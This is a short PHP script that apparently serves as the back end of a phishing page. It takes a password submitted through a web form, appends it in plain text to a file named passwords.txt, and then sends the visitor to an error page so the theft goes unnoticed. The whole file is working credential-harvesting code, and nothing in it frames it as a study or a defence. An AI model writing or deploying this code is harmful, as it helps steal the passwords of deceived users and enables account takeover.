<?php
  $log_file_name = 'passwords.txt';
  $p = $_POST['passwrod'];
  $message = "Password: ".$p."\n";
  file_put_contents($log_file_name, $message, FILE_APPEND);
  header('Location: /error.html'); // redirect back to the main site
?>
